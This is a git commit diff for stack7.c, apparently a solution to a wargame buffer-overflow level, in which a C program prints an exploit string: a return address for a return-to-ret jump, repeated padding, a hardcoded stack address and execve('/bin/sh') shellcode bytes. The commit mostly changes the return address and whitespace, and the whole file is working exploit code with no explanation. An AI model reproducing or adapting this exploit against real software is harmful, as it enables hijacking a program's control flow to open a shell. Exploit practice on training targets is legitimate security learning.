8eff6aaccd51a4a846088459412864680f32bee2
Mimoja <max-schander@freenet.de>
2017-03-15 18:16:16 +0100

    added 7 with the same code as for 6

--- stack7.c
+++ stack7.c
@@ -7,23 +7,22 @@ int main(void){
     }
 
     // return to the return of main
-    int payload = 0x08048508;
+    int payload = 0x08048553;
     // 4 addresses padding before the return pointer
     for(int bruteforce = 0; bruteforce < 5; bruteforce++){
       for(int i = 0; i < 4 ; i++){
           printf("%c", ((char*)&payload)[i]);
       }
     }
-
     int finalreturn = 0xbffff7b0+4;
     for(int i = 0; i < 4 ; i++){
         printf("%c", ((char*)&finalreturn)[i]);
     }
 
     char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
-                  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+                      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
     for(int i = 0; i < strlen(shellcode); i++){
-        printf("%c", (shellcode)[i]);
+      printf("%c", (shellcode)[i]);
     }
 
     return 0;
